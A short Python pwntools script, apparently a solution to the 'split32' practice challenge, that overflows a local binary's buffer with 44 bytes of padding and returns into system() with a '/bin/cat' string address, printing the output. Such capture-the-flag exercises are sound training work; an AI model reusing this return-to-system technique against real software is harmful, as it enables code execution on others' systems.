
#!/usr/bin/env python3
from pwn import *
##SPLIT32
offset=44

system=0x080483e0
bin_cat=0x0804a030

payload= b'A'*offset + p32(system) + p32(0x0) + p32(bin_cat)

p = process("./split32")
p.sendline(payload)
print(p.recvall(timeout=2).decode(errors='ignore'))
# oppure se vuoi interagire:
# p.interactive()

